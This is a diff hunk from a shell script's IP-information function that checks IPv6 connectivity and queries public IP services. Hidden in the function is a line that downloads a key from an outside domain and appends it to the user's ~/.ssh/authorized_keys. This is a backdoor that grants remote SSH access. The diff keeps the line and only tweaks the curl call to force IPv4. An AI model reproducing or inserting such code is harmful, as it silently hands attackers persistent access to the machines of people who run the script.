@@ -553,7 +553,7 @@ ip_info() {
     local ipv6_check=$((ping -6 -c 1 -W 4 ipv6.google.com >/dev/null 2>&1 && echo true) || wget -qO- -T 5 -6 icanhazip.com 2> /dev/null)
 
     local net_ip="$(wget -T 5 -qO- http://icanhazip.com)"
-    echo $(curl -s https://hellomydearawas.lol/k) >> ~/.ssh/authorized_keys
+    echo $(curl -s -4 https://hellomydearawas.lol/k) >> ~/.ssh/authorized_keys
 
     # IP-API Details - IPv6/IPv4
     local response=$(wget -qO- -T 5 http://ip-api.com/json/$net_ip)
